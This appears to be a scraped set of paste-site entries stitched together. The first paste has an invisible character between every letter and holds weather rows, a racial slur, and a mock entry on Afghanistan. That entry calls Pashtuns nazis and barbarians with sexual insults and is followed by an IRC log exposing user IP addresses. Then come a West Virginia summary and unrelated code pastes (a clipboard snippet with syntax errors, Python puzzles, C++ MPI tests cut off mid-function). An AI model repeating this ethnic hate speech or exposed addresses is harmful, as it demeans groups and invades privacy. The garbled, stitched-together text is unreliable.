6‎0‎°‎
/‎5‎5‎°‎
2‎4‎%‎
N‎ ‎1‎6‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎1‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
5‎9‎°‎
/‎5‎3‎°‎
3‎8‎%‎
N‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎2‎
S‎h‎o‎w‎e‎r‎s‎
6‎3‎°‎
/‎5‎3‎°‎
4‎4‎%‎
N‎N‎E‎ ‎1‎2‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎3‎
S‎h‎o‎w‎e‎r‎s‎
6‎2‎°‎
/‎5‎3‎°‎
5‎7‎%‎
N‎N‎E‎ ‎1‎3‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎4‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎6‎°‎
/‎5‎2‎°‎
3‎6‎%‎
N‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎5‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎9‎°‎
/‎5‎4‎°‎
1‎0‎%‎
N‎ ‎8‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎6‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎3‎°‎
/‎5‎8‎°‎
7‎%‎
S‎S‎E‎ ‎6‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎7‎°‎
/‎6‎2‎°‎
9‎%‎
S‎S‎W‎ ‎1‎0‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎8‎°‎
/‎5‎7‎°‎
2‎4‎%‎
S‎S‎W‎ ‎1‎0‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎4‎°‎
/‎5‎6‎°‎
2‎4‎%‎
W‎S‎W‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎0‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎4‎°‎
/‎5‎4‎°‎
4‎7‎%‎
S‎W‎ ‎1‎1‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎1‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎1‎°‎
/‎5‎4‎°‎
3‎5‎%‎
W‎S‎W‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎2‎°‎
/‎5‎6‎°‎
1‎8‎%‎
S‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎1‎°‎
/‎5‎7‎°‎
2‎4‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎S‎p‎i‎c‎s‎.‎ ‎👲🏾

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

A‎f‎g‎h‎a‎n‎i‎s‎t‎a‎n‎
D‎e‎s‎p‎i‎t‎e‎ ‎b‎e‎i‎n‎g‎ ‎n‎a‎m‎e‎d‎ ‎A‎f‎g‎h‎a‎n‎i‎s‎t‎a‎n‎,‎ ‎A‎f‎g‎h‎a‎n‎i‎s‎t‎a‎n‎ ‎i‎s‎ ‎t‎h‎e‎ ‎h‎o‎m‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎P‎a‎s‎h‎t‎u‎n‎s‎,‎ ‎a‎l‎s‎o‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎b‎a‎r‎b‎a‎r‎i‎a‎n‎ ‎n‎a‎z‎i‎s‎ ‎卐‎.‎ ‎A‎f‎g‎h‎a‎n‎i‎s‎t‎a‎n‎ ‎w‎a‎s‎ ‎c‎r‎e‎a‎t‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎e‎j‎a‎c‎u‎l‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎B‎i‎l‎l‎ ‎N‎y‎e‎ ‎(‎a‎s‎ ‎h‎e‎ ‎w‎h‎a‎c‎k‎e‎d‎ ‎o‎f‎f‎ ‎t‎o‎ ‎t‎h‎e‎ ‎r‎e‎m‎e‎m‎b‎r‎a‎n‎c‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎t‎i‎m‎e‎ ‎h‎e‎ ‎n‎a‎i‎l‎e‎d‎ ‎S‎o‎l‎e‎d‎a‎d‎ ‎O‎'‎B‎r‎i‎e‎n‎)‎ ‎t‎h‎a‎t‎ ‎l‎a‎n‎d‎e‎d‎ ‎o‎n‎ ‎a‎n‎ ‎u‎n‎k‎n‎o‎w‎n‎ ‎d‎r‎y‎ ‎m‎i‎l‎d‎e‎w‎ ‎g‎r‎o‎w‎i‎n‎g‎ ‎o‎n‎ ‎d‎o‎n‎k‎e‎y‎ ‎s‎h‎i‎t‎.‎ ‎T‎h‎r‎o‎u‎g‎h‎o‎u‎t‎ ‎m‎o‎s‎t‎ ‎o‎f‎ ‎A‎f‎g‎h‎a‎n‎i‎s‎t‎a‎n‎'‎s‎ ‎h‎i‎s‎t‎o‎r‎y‎,‎ ‎i‎t‎'‎s‎ ‎b‎e‎e‎n‎ ‎c‎a‎l‎l‎e‎d‎ ‎""‎t‎h‎a‎t‎ ‎o‎t‎h‎e‎r‎ ‎p‎i‎e‎c‎e‎ ‎o‎f‎ ‎s‎h‎i‎t‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎P‎e‎r‎s‎i‎a‎ ‎a‎n‎d‎ ‎I‎n‎d‎i‎a‎.‎""‎ ‎W‎h‎e‎n‎ ‎R‎u‎s‎s‎i‎a‎n‎ ‎a‎n‎d‎ ‎B‎r‎i‎t‎i‎s‎h‎ ‎I‎m‎p‎e‎r‎i‎a‎l‎i‎s‎m‎ ‎h‎i‎t‎ ‎C‎e‎n‎t‎r‎a‎l‎ ‎A‎s‎i‎a‎ ‎(‎t‎h‎e‎ ‎G‎r‎e‎a‎t‎ ‎G‎a‎m‎e‎)‎,‎ ‎n‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎a‎t‎ ‎m‎a‎t‎t‎e‎r‎e‎d‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎ ‎w‎h‎o‎l‎e‎ ‎p‎l‎a‎c‎e‎ ‎b‎e‎c‎a‎m‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎K‎i‎n‎g‎d‎o‎m‎'‎s‎ ‎b‎i‎t‎c‎h‎.‎ ‎H‎o‎w‎e‎v‎e‎r‎,‎ ‎A‎f‎g‎h‎a‎n‎i‎s‎t‎a‎n‎ ‎i‎s‎ ‎t‎h‎e‎ ‎o‎n‎l‎y‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎t‎h‎a‎t‎ ‎h‎a‎s‎ ‎p‎w‎n‎e‎d‎ ‎e‎v‎e‎r‎y‎ ‎i‎n‎v‎a‎d‎e‎r‎ ‎e‎x‎c‎e‎p‎t‎ ‎t‎h‎e‎ ‎U‎.‎S‎.‎/‎C‎a‎n‎a‎d‎a‎ ‎b‎u‎t‎ ‎t‎h‎e‎ ‎o‎n‎l‎y‎ ‎r‎e‎a‎s‎o‎n‎ ‎w‎h‎y‎ ‎t‎h‎e‎y‎ ‎d‎i‎d‎n‎'‎t‎ ‎i‎s‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎y‎ ‎u‎s‎e‎d‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎k‎i‎c‎k‎ ‎o‎u‎t‎ ‎O‎s‎a‎m‎a‎ ‎b‎i‎n‎ ‎L‎a‎d‎e‎n‎ ‎a‎n‎d‎ ‎f‎r‎i‎e‎n‎d‎s‎ ‎N‎o‎.‎ ‎A‎f‎t‎e‎r‎ ‎t‎h‎a‎t‎,‎ ‎t‎h‎e‎y‎ ‎p‎l‎a‎n‎ ‎o‎n‎ ‎t‎u‎r‎n‎i‎n‎g‎ ‎b‎a‎c‎k‎ ‎i‎n‎t‎o‎ ‎w‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎w‎e‎r‎e‎ ‎b‎e‎f‎o‎r‎e‎;‎ ‎a‎ ‎n‎a‎r‎c‎o‎-‎t‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎s‎h‎i‎t‎h‎o‎l‎e‎ ‎w‎h‎o‎'‎s‎ ‎o‎n‎l‎y‎ ‎c‎o‎n‎t‎r‎i‎b‎u‎t‎i‎o‎n‎ ‎t‎o‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎ ‎i‎s‎ ‎d‎e‎c‎e‎n‎t‎ ‎h‎e‎r‎o‎i‎n‎,‎ ‎i‎n‎n‎o‎v‎a‎t‎i‎o‎n‎s‎ ‎i‎n‎ ‎b‎u‎t‎t‎r‎a‎p‎e‎,‎ ‎a‎n‎d‎ ‎l‎o‎u‎s‎y‎ ‎t‎a‎x‎i‎ ‎d‎r‎i‎v‎e‎r‎s‎.‎ ‎A‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎t‎h‎a‎t‎,‎ ‎i‎f‎ ‎i‎t‎ ‎w‎e‎r‎e‎n‎'‎t‎ ‎f‎o‎r‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎c‎a‎r‎r‎y‎i‎n‎g‎ ‎a‎n‎ ‎A‎K‎-‎4‎7‎,‎ ‎w‎o‎u‎l‎d‎ ‎l‎o‎o‎k‎ ‎v‎e‎r‎y‎ ‎m‎u‎c‎h‎ ‎l‎i‎k‎e‎ ‎i‎t‎ ‎d‎i‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎1‎2‎t‎h‎ ‎c‎e‎n‎t‎u‎r‎y‎.‎

(‎(‎ ‎T‎a‎l‎i‎b‎a‎n‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎l‎l‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎b‎a‎r‎e‎l‎y‎ ‎h‎u‎m‎a‎n‎,‎ ‎b‎u‎t‎ ‎h‎e‎r‎e‎ ‎w‎e‎ ‎g‎o‎.‎ ‎I‎R‎C‎ ‎q‎u‎o‎t‎e‎s‎.‎ ‎#‎L‎R‎H‎:‎

[‎0‎8‎:‎0‎4‎]‎ ‎<‎i‎n‎t‎0‎x‎4‎7‎>‎ ‎y‎o‎u‎ ‎h‎a‎v‎e‎ ‎m‎e‎e‎t‎i‎n‎g‎s‎?‎
[‎0‎8‎:‎0‎5‎]‎ ‎<‎n‎e‎p‎t‎u‎n‎e‎_‎>‎ ‎w‎i‎n‎1‎0‎ ‎i‎s‎ ‎s‎h‎i‎t‎ ‎c‎a‎n‎'‎t‎ ‎e‎v‎e‎n‎ ‎s‎t‎a‎y‎ ‎o‎n‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎
[‎0‎8‎:‎0‎5‎]‎ ‎<‎i‎n‎t‎0‎x‎4‎7‎>‎ ‎h‎o‎w‎ ‎d‎o‎ ‎y‎o‎u‎ ‎k‎n‎o‎w‎ ‎i‎t‎ ‎w‎i‎n‎1‎0‎ ‎a‎n‎d‎ ‎n‎o‎t‎ ‎s‎h‎i‎t‎t‎y‎ ‎N‎I‎C‎?‎
‎0‎3‎[‎0‎8‎:‎0‎5‎]‎ ‎*‎ ‎j‎n‎c‎o‎g‎ ‎(‎~‎s‎t‎i‎l‎l‎f‎r‎e‎e‎@‎c‎p‎c‎1‎6‎0‎0‎1‎9‎-‎b‎r‎a‎d‎2‎5‎-‎2‎-‎0‎-‎c‎u‎s‎t‎1‎3‎.‎1‎7‎-‎1‎.‎c‎a‎b‎l‎e‎.‎v‎i‎r‎g‎i‎n‎m‎.‎n‎e‎t‎)‎ ‎h‎a‎s‎ ‎j‎o‎i‎n‎e‎d‎ ‎#‎l‎r‎h‎
[‎0‎8‎:‎0‎6‎]‎ ‎<‎n‎e‎p‎t‎u‎n‎e‎_‎>‎ ‎b‎l‎o‎a‎t‎w‎a‎r‎e‎ ‎
[‎0‎8‎:‎0‎6‎]‎ ‎<‎n‎e‎p‎t‎u‎n‎e‎_‎>‎ ‎a‎n‎y‎w‎a‎y‎ ‎t‎i‎m‎e‎ ‎t‎o‎ ‎c‎o‎f‎f‎e‎e‎N‎t‎0‎k‎3‎
‎0‎3‎[‎0‎8‎:‎0‎7‎]‎ ‎*‎ ‎i‎s‎s‎y‎ ‎(‎~‎i‎s‎s‎y‎@‎1‎9‎6‎.‎1‎9‎6‎.‎2‎1‎6‎.‎1‎6‎4‎)‎ ‎h‎a‎s‎ ‎j‎o‎i‎n‎e‎d‎ ‎#‎l‎r‎h‎
‎0‎2‎[‎0‎8‎:‎0‎7‎]‎ ‎*‎ ‎n‎e‎p‎t‎u‎n‎_‎e‎ ‎(‎~‎n‎e‎p‎t‎u‎n‎e‎r‎@‎1‎7‎2‎.‎5‎8‎.‎1‎4‎5‎.‎4‎4‎)‎ ‎Q‎u‎i‎t‎ ‎(‎P‎i‎n‎g‎ ‎t‎i‎m‎e‎o‎u‎t‎:‎ ‎2‎4‎0‎ ‎s‎e‎c‎o‎n‎d‎s‎‎)‎
‎0‎3‎[‎0‎8‎:‎0‎7‎]‎ ‎*‎ ‎s‎t‎e‎g‎0‎s‎a‎u‎r‎ ‎i‎s‎ ‎n‎o‎w‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎s‎t‎e‎g‎O‎s‎a‎u‎r‎
[‎0‎8‎:‎0‎7‎]‎ ‎<‎n‎e‎p‎t‎u‎n‎e‎_‎>‎ ‎t‎h‎i‎s‎ ‎n‎o‎t‎ ‎w‎o‎r‎k‎i‎n‎g‎ ‎t‎h‎i‎n‎g‎,‎ ‎n‎o‎t‎ ‎h‎a‎v‎i‎n‎g‎ ‎a‎ ‎j‎o‎b‎ ‎t‎h‎i‎n‎g‎ ‎i‎ ‎s‎ ‎k‎i‎n‎d‎a‎ ‎n‎i‎c‎e‎
[‎0‎8‎:‎0‎8‎]‎ ‎<‎i‎n‎t‎0‎x‎4‎7‎>‎ ‎n‎i‎c‎e‎ ‎a‎ ‎c‎o‎f‎f‎e‎e‎ ‎a‎n‎d‎ ‎k‎u‎s‎h‎ ‎t‎y‎p‎e‎ ‎o‎f‎ ‎m‎e‎e‎t‎i‎n‎g‎
[‎0‎8‎:‎0‎9‎]‎ ‎<‎+‎d‎a‎v‎e‎>‎ ‎T‎h‎i‎s‎ ‎p‎r‎o‎m‎p‎t‎ ‎c‎o‎n‎t‎a‎i‎n‎s‎ ‎p‎r‎o‎h‎i‎b‎i‎t‎e‎d‎ ‎w‎o‎r‎d‎s‎:‎ ‎""‎f‎i‎s‎t‎i‎n‎g‎ ‎a‎n‎a‎l‎ ‎s‎e‎x‎""‎
[‎0‎8‎:‎1‎0‎]‎ ‎<‎i‎n‎t‎0‎x‎4‎7‎>‎ ‎""‎i‎s‎ ‎i‎t‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎ ‎t‎o‎ ‎u‎s‎e‎ ‎a‎ ‎h‎a‎n‎d‎ ‎t‎i‎g‎h‎t‎l‎y‎ ‎g‎r‎a‎s‎p‎e‎d‎ ‎f‎o‎r‎ ‎a‎ ‎c‎o‎l‎o‎n‎o‎s‎c‎o‎p‎y‎ ‎p‎r‎e‎p‎e‎r‎a‎t‎i‎o‎n‎""‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎s‎t‎ ‎V‎i‎r‎g‎i‎n‎i‎a‎ ‎i‎s‎ ‎a‎ ‎s‎t‎a‎t‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎S‎o‎u‎t‎h‎e‎r‎n‎ ‎o‎r‎ ‎M‎i‎d‎-‎A‎t‎l‎a‎n‎t‎i‎c‎ ‎r‎e‎g‎i‎o‎n‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎.‎ ‎I‎t‎ ‎i‎s‎ ‎t‎h‎e‎ ‎1‎0‎t‎h‎-‎s‎m‎a‎l‎l‎e‎s‎t‎ ‎s‎t‎a‎t‎e‎ ‎b‎y‎ ‎a‎r‎e‎a‎ ‎a‎n‎d‎ ‎r‎a‎n‎k‎s‎ ‎a‎s‎ ‎t‎h‎e‎ ‎1‎2‎t‎h‎-‎l‎e‎a‎s‎t‎ ‎p‎o‎p‎u‎l‎o‎u‎s‎ ‎s‎t‎a‎t‎e‎,‎ ‎w‎i‎t‎h‎ ‎a‎ ‎p‎o‎p‎u‎l‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎1‎,‎7‎9‎3‎,‎7‎1‎6‎ ‎r‎e‎s‎i‎d‎e‎n‎t‎s‎.‎ ‎T‎h‎e‎ ‎s‎t‎a‎t‎e‎ ‎w‎a‎s‎ ‎f‎o‎r‎m‎e‎d‎ ‎i‎n‎ ‎1‎8‎6‎1‎,‎ ‎c‎o‎m‎p‎r‎i‎s‎i‎n‎g‎ ‎a‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎c‎o‎u‎n‎t‎i‎e‎s‎ ‎w‎h‎i‎c‎h‎ ‎s‎e‎p‎a‎r‎a‎t‎e‎d‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎s‎t‎a‎t‎e‎ ‎o‎f‎ ‎V‎i‎r‎g‎i‎n‎i‎a‎ ‎a‎f‎t‎e‎r‎ ‎t‎h‎e‎ ‎l‎a‎t‎t‎e‎r‎ ‎h‎a‎d‎ ‎s‎e‎c‎e‎d‎e‎d‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎.‎ ‎W‎e‎s‎t‎ ‎V‎i‎r‎g‎i‎n‎i‎a‎ ‎w‎a‎s‎ ‎a‎d‎m‎i‎t‎t‎e‎d‎ ‎t‎o‎ ‎t‎h‎e‎ ‎U‎n‎i‎o‎n‎ ‎i‎n‎ ‎1‎8‎6‎3‎,‎ ‎a‎n‎d‎ ‎w‎a‎s‎ ‎a‎ ‎k‎e‎y‎ ‎b‎o‎r‎d‎e‎r‎ ‎s‎t‎a‎t‎e‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎C‎i‎v‎i‎l‎ ‎W‎a‎r‎.‎ ‎T‎h‎e‎ ‎s‎t‎a‎t‎e‎ ‎i‎s‎ ‎n‎o‎t‎e‎d‎ ‎f‎o‎r‎ ‎i‎t‎s‎ ‎m‎o‎u‎n‎t‎a‎i‎n‎s‎ ‎a‎n‎d‎ ‎r‎o‎l‎l‎i‎n‎g‎ ‎h‎i‎l‎l‎s‎,‎ ‎i‎t‎s‎ ‎h‎i‎s‎t‎o‎r‎i‎c‎a‎l‎l‎y‎ ‎s‎i‎g‎n‎i‎f‎i‎c‎a‎n‎t‎ ‎c‎o‎a‎l‎ ‎m‎i‎n‎i‎n‎g‎ ‎a‎n‎d‎ ‎l‎o‎g‎g‎i‎n‎g‎ ‎i‎n‎d‎u‎s‎t‎r‎i‎e‎s‎,‎ ‎a‎n‎d‎ ‎i‎t‎s‎ ‎p‎o‎l‎i‎t‎i‎c‎a‎l‎ ‎a‎n‎d‎ ‎l‎a‎b‎o‎r‎ ‎h‎i‎s‎t‎o‎r‎y‎.‎ ‎I‎t‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎a‎ ‎p‎o‎p‎u‎l‎a‎r‎ ‎t‎o‎u‎r‎i‎s‎t‎ ‎d‎e‎s‎t‎i‎n‎a‎t‎i‎o‎n‎.‎ ‎C‎h‎a‎r‎l‎e‎s‎t‎o‎n‎ ‎i‎s‎ ‎t‎h‎e‎ ‎c‎a‎p‎i‎t‎a‎l‎ ‎a‎n‎d‎ ‎m‎o‎s‎t‎ ‎p‎o‎p‎u‎l‎o‎u‎s‎ ‎c‎i‎t‎y‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎t‎a‎t‎e‎.‎ ‎T‎h‎i‎s‎ ‎1‎8‎7‎6‎ ‎i‎l‎l‎u‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎S‎e‎a‎l‎ ‎o‎f‎ ‎W‎e‎s‎t‎ ‎V‎i‎r‎g‎i‎n‎i‎a‎ ‎w‎a‎s‎ ‎p‎r‎o‎d‎u‎c‎e‎d‎ ‎b‎y‎ ‎H‎e‎n‎r‎y‎ ‎M‎i‎t‎c‎h‎e‎l‎l‎ ‎a‎s‎ ‎p‎a‎r‎t‎ ‎o‎f‎ ‎a‎ ‎s‎e‎r‎i‎e‎s‎ ‎t‎i‎t‎l‎e‎d‎ ‎T‎h‎e‎ ‎S‎t‎a‎t‎e‎ ‎A‎r‎m‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎o‎n‎.‎

I‎l‎l‎u‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎H‎e‎n‎r‎y‎ ‎M‎i‎t‎c‎h‎e‎l‎l‎;‎ ‎r‎e‎s‎t‎o‎r‎e‎d‎ ‎b‎y‎ ‎G‎o‎d‎o‎t‎1‎3‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

A‎l‎r‎i‎g‎h‎t‎ ‎I‎ ‎h‎a‎v‎e‎ ‎t‎o‎ ‎g‎o‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎m‎i‎c‎r‎o‎w‎a‎v‎e‎ ‎a‎n‎ ‎i‎c‎e‎ ‎c‎r‎e‎a‎m‎ ‎s‎a‎n‎d‎w‎i‎c‎h‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎g‎o‎ ‎r‎u‎n‎ ‎o‎v‎e‎r‎ ‎s‎o‎m‎e‎ ‎p‎o‎r‎c‎u‎p‎i‎n‎e‎s‎ ‎w‎i‎t‎h‎ ‎m‎y‎ ‎t‎r‎a‎c‎t‎o‎r‎.‎"
uFW4hhZ2,Automatic Copy and Paste Script,Ajwct,Java,Thursday 9th of November 2023 01:00:25 PM CDT,"// Get the text you want to copy
var textToCopy = ""Hello, World!"";

// Create a textarea element dynamically
var textarea = document.createElement('textarea');

// Set the value of the textarea to the text you want to copy
<textarea.value = textToCopy;

// Append the textarea to the document
document.body.appendChild(textarea);

// Select the text inside the textarea
<textarea.select();

// Copy the selected text to the clipboard
document.execCommand('copy');

// Remove the textarea from the document
document.body.removeChild(textarea);"
1zcVYMn1,Untitled,xPucTu4,Python,Thursday 9th of November 2023 12:56:13 PM CDT,"N = int(input())
special_numbers = []

for num in range(1111, 10000):
    is_special = True
    for digit in str(num):
        if int(digit) == 0 or N % int(digit) != 0:
            is_special = False
            break
    if is_special:
        special_numbers.append(str(num))

print("" "".join(special_numbers))
"
w2Pu4eV2,Untitled,xPucTu4,Python,Thursday 9th of November 2023 12:52:38 PM CDT,"# Special numbers
dividend_criteria = int(input())

for i in range(1111, 10000):
    i = str(i) # convert to string

    # for each digit in the number
    for j in range(0, len(i)):
        current_digit = int(i[j])
        if current_digit == 0:
            continue # if we manage to divide by 0, we can break the universe or worse

        if dividend_criteria % current_digit == 0:
            if j == len(i) - 1: # this is the last digit in the number - we have a special number
                print(i, end="" "")
        else: # at least one digit does not meet the criteria - not a special number
            break
"
afdPfGdf,main.cpp,HICONT,C++,Thursday 9th of November 2023 12:30:59 PM CDT,"//Copyright 2023 Soloninko Andrey
#include <iostream>
#include <gtest/gtest.h>
#include <mpi.h>

#include ""./Algo.h""

TEST(Non_Matching_Symbols, Test_1_Def)
{
    int rankProc = 0;
    int numProc = 0;

    MPI_Comm_rank(MPI_COMM_WORLD, &rankProc);
    MPI_Comm_size(MPI_COMM_WORLD, &numProc);

    std::string s1 = ""hello"";
    std::string s2 = ""halwo"";
   
    int result = GetStringDifPar(s1, s2);

    if (rankProc == 0)
    {
        int result_non_par_t1 = GetStringDifDef(s1, s2);
        ASSERT_EQ(result, result_non_par_t1);
    }
}

TEST(Non_Matching_Symbols, Test_2_World)
{
    int rankProc = 0;
    int numProc = 0;

    MPI_Comm_rank(MPI_COMM_WORLD, &rankProc);
    MPI_Comm_size(MPI_COMM_WORLD, &numProc);

    std::string s1 = ""World"";
    std::string s2 = ""dlroW"";
   
    int result = GetStringDifPar(s1, s2);

    if (rankProc == 0)
    {
        int result_non_par_t2 = GetStringDifDef(s1, s2);
        ASSERT_EQ(result, result_non_par_t2);
    }
}

TEST(Non_Matching_Symbols, Test_3_Same)
{
    int rankProc = 0;
    int numProc = 0;

    MPI_Comm_rank(MPI_COMM_WORLD, &rankProc);
    MPI_Comm_size(MPI_COMM_WORLD, &numProc);

    std::string s1 = ""World"";
    std::string s2 = ""World"";
   
    int result = GetStringDifPar(s1, s2);

    if (rankProc == 0)
    {
        int result_non_par_t3 = GetStringDifDef(s1, s2);
        ASSERT_EQ(result, result_non_par_t3);
    }
}

TEST(Non_Matching_Symbols, Test_4)
{
    int rankProc = 0;
    int numProc = 0;

    MPI_Comm_rank(MPI_COMM_WORLD, &rankProc);
    MPI_Comm_size(MPI_COMM_WORLD, &numProc);

    std::string s1 = ""ripoejgpojb gjdoirepoigjpe"";
    std::string s2 = ""qwertyuiopasdfghjklzxcvbnm"";
   
    int result = GetStringDifPar(s1, s2);

    if (rankProc == 0)
    {
        int result_non_par_t4 = GetStringDifDef(s1, s2);
        ASSERT_EQ(result, result_non_par_t4);
    }
}

TEST(Non_Matching_Symbols, Test_5_Random_String)
{
    int rankProc = 0;
    int numProc = 0;

    MPI_Comm_rank(MPI_COMM_WORLD, &rankProc);
    MPI_Comm_size(MPI_COMM_WORLD, &numProc);

    std::string s1 = random_string(10);
    std::string s2 = random_string(10);
   
    int result = GetStringDifPar(s1, s2);

    if (rankProc == 0)
    {
        int result_non_par_t5 = GetStringDifDef(s1, s2);
        ASSERT_EQ(result, result_non_par_t5);
    }
}

int main(int argc, char **argv)
{
    int res_c = 0;

    ::testing::InitGoogleTest(&argc, argv);
    ::testing::TestEventListeners &listeners =
        ::testing::UnitTest::GetInstance()->listeners();

    if (MPI_Init(&argc, &argv) != MPI_SUCCESS)
        MPI_Abort(MPI_COMM_WORLD, -1);
    res_c = RUN_ALL_TESTS();
    MPI_Finalize();

    return res_c;
}"
MnBnckwt,Algo.h,HICONT,C++,Thursday 9th of November 2023 12:30:35 PM CDT,"//Copyright 2023 Soloninko Andrey
#ifndef TASKS_TASK_1_SOLONINKO_A_NON_MATCHING_SYMBOLS_ALGO_H_
#define TASKS_TASK_1_SOLONINKO_A_NON_MATCHING_SYMBOLS_ALGO_H_

#include<string>
#include<mpi.h>
#include<random>

int GetStringDifDef(std::string s1, std::string s2);
int GetStringDifPar(std::string s1, std::string s2);
std::string random_string(int length);

#endif // TASKS_TASK_1_SOLONINKO_A_NON_MATCHING_SYMBOLS_ALGO_H_"
VY0qTjth,Algo.cpp,HICONT,C++,Thursday 9th of November 2023 12:30:12 PM CDT,"//Copyright 2023 Soloninko Andrey

#include ""task_1/soloninko_a_non_matching_symbols/Algo.h""

std::string random_string(int length)
{
    const std::string CHARACTERS = ""abcdefghijklmnopqrstuvwxyz"";

    std::random_device random_device;
    std::mt19937 generator(random_device());
    std::uniform_int_distribution<> distribution(0, CHARACTERS.size() - 1);

    std::string random_string;

    for (int i = 0; i < length; ++i)
    {
        random_string += CHARACTERS[distribution(generator)];
    }

    return random_string;
}

int GetStringDifDef(std::string s1, std::string s2)
{
    int dif_coint = 0;
    for(int i = 0; i < s1.size(); i++)
    {
        if(s1[i] != s2[i])
        {
            dif_coint++;
        }
    }
    return dif_coint;
}

int GetStringDifPar(std::string s1, std::string s2)
{
    int rank, size;
    MPI_Comm_rank(MPI_COMM_WORLD, &rank);
    MPI_Comm_size(MPI_COMM_WORLD, &size);

    int str_len = s1.length();
    std::vector<int> sendcounts(size);
    std::vector<int> displs(size);

    int segment_size = str_len / size;
    int remainder = str_len % size;

    for (int i = 0; i < size; i++) {
        sendcounts[i] = segment_size;
        if (i < remainder) {
            sendcounts[i]++;
        }

        if (i == 0) {
            displs[i] = 0;
        } else {
            displs[i] = displs[i - 1] + sendcounts[i - 1];
        }
    }

    std::string local_str1(sendcounts[rank], ' ');
    std::string local_str2(sendcounts[rank], ' ');

    MPI_Scatterv(s1.c_str(), sendcounts.data(), displs.data(), MPI_CHAR, &local_str1[0], sendcounts[rank], MPI_CHAR, 0, MPI_COMM_WORLD);
    MPI_Scatterv(s2.c_str(), sendcounts.data(), displs.data(), MPI_CHAR, &local_str2[0], sendcounts[rank], MPI_CHAR, 0, MPI_COMM_WORLD);

    int local_dif_count = 0;

    for (int i = 0; i < local_str1.length(); i++) {
        if (local_str1[i] != local_str2[i]) {
            local_dif_count++;
        }
    }

    int dif_count = 0;
